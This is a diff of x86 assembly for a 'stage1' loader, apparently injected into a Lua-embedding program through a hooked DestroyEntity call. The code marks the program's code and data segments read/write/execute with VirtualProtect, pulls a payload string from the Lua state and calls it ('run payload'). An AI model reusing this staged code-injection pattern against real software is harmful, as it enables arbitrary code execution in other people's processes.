@@ -2,27 +2,27 @@
 
 bits 32
 section text
-org loaderBase
+org 0                           ; has no definite origin!
+                                ; ebx = lua_state (from stage0)
 
-loader:
-		mov dword [ecx], 76E3CCh ; restore entity obj
-		push 0
-		call 57A65Eh			 ; call original DestroyEntity()
-		pushad
-		
+stage1:        
 		mov al, [hookRsrcFlag]
 		test al, al
 		jnz .copyPayload
 		
         
         ; cache cursor ?    
+        push eax                ; dummy
         
-		push bufferOffset		; get write permissions for .text, .data, and .rsrc
+                                ; get write permissions for .text, .data, and .rsrc
+                                
+		push esp		        ; ptr store old permissions (dummy)
 		push 40h				; new access: R/W/X
 		push 64B000h			; length
 		push 401000h			; start of segment 
 		call [virtualProtect]
 		test eax, eax
+		pop eax                 ; remove dummy
 		jz .abort
 		
 		call [lua_open]
@@ -32,7 +32,7 @@ loader:
 
 .copyPayload:	
 		
-		push 2
+		push 3
 		push ebx
 		call [lua_tostring]
 		pop ecx
@@ -45,11 +45,5 @@ loader:
 		
 		call [eax]				; run payload
 		
-.abort:
-        popad
-		retn 4
-
-bufferOffset:
-
-;padding equ (4 - (($-$$) % 4)) % 4
-;times padding int3				; pad to n*4bytes
+.abort:	
+		retn
